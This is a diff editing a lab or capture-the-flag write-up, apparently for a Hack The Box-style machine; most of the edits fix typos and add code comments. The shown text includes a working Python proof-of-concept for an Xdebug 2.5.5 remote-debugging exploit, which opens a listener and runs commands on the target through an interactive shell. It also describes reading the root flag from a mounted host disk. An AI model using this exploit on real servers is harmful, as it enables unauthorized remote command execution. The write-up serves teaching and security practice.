@@ -104,7 +104,7 @@ Inspecting the page source code, there's not much to be discovered.
 </html>
 ```
 
-Taking a look at the **Response** headers under **Network**, using **Web Developer Tools** (CTRL + SHIFT + i), a reference to XDebug is found. Specifically `Xdebug: 2.5.5`.
+Taking a look at the **Response** headers under **Network**, using **Web Developer Tools** (CTRL + SHIFT + i), a reference to Xdebug is found. Specifically `Xdebug: 2.5.5`.
 
 [Xdebug](https://xdebug.org/) is an open-source debugging and profiling utility for PHP code.
 
@@ -121,24 +121,25 @@ A known exploit for `Xdebug: 2.5.5`, suggests that when the remote debugging is 
 We create a script that will listen on localhost:9000 and grant us an interactive shell. You can find my Proof-of-Concept also on my [GitHub](https://github.com/n0m4d22/PoC-CVE-2015-10141-Xdebug)!
 
 ```python
-import socket
 import base64
 import re
-import sys
+import socket
 import subprocess
 
+# Process the response
 def parse_xdebug_response(data):
-   # Seperate received data for decoding
+   # Separate received data for decoding
    match = re.search(r'<!\[CDATA\[(.*?)\]\]>', data)
    if match:
       encoded_data = match.group(1)
       try:
-         # Return decoded reponse
+         # Return decoded response
          return base64.b64decode(encoded_data).decode('utf-8')
       except (base64.binascii.Error, UnicodeDecodeError):
          return "An error occured while decoding the base64 data."
    return "No XML response was found."
 
+# Create the interactive shell
 def xdebug_shell(host, port, init):
    try:
       # Create a new socket
@@ -146,25 +147,27 @@ def xdebug_shell(host, port, init):
       sk.bind((host, port))
       sk.listen(1)
       print(f"[*] Connecting to {host}:{port} ...")
+      
       # Create a subprocess to connect on Xdebug host.
       print(f"[*] Initializing debugging: {init}")
       subprocess.Popen(init, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
       
+      # Establish the connection
       connection, address = sk.accept()
       print(f"[*] Connection to {address} established.")
    except socket.error as e:
       print(f"[-] Connection failed: {e}")
       return
    except subprocess.CalledProcessError as e:
-        print(f"[-] An error occuring while connecting to Xdebug: {e}")
-        return
+      print(f"[-] An error occurred while connecting to Xdebug: {e}")
+      return
 
    # Fetch the initial response from the server
    initial_response = connection.recv(4096).decode('utf-8')
 
    while True:
       try:
-         # Enter command as ser input 
+         # Enter command as user input 
          command_input = input('$ ')
          # Try again if no input was provided to avoid breaking the script
          if not command_input:
@@ -177,18 +180,15 @@ def xdebug_shell(host, port, init):
             
          # Send the command to the server
          connection.sendall(full_command)
-
-         # Fetch the command from the server
+         # Fetch the response from the server
          response = connection.recv(4096).decode('utf-8')
          
          # Check for empty response
          if not response:
             print("[-] Connection closed.")
             break
-
-         # Deconde and print the response 
+         # Decode and print the response 
          print(parse_xdebug_response(response))
-
       except (socket.error, ConnectionResetError) as e:
          print(f"[-] Connection error: {e}")
          break
@@ -196,6 +196,7 @@ def xdebug_shell(host, port, init):
          print("\nExiting interactive shell.")
          break
 
+   # Close the connections
    connection.close()
    sk.close()
 
@@ -690,7 +691,7 @@ bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys 
 boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
 ```
 
-The `root` (or `/`) of the filesystem is mounted, and the `root.txt` flag can be found under `/dev/sda1/root`.
+The `root` (or `/`) of the filesystem is mounted, and the `root.txt` flag can be found under `/mnt/sda1/root`.
 
 ---
 
@@ -712,7 +713,7 @@ The `root` (or `/`) of the filesystem is mounted, and the `root.txt` flag can be
 
    - **Impact**: Led to unauthorized user access, first to the `icarus` user on a Docker container and subsequently to the `prometheus` user on the main system.
 
-   - **Mitigation**: Enforce strong password policies, and avoid using sensitive information in easily accessible files like DNS records or textfiles.
+   - **Mitigation**: Enforce strong password policies, and avoid using sensitive information in easily accessible files like DNS records or text files.
 
 -  ***DNS Zone Transfer (AXFR)***
    -  **Type**: Information Disclosure
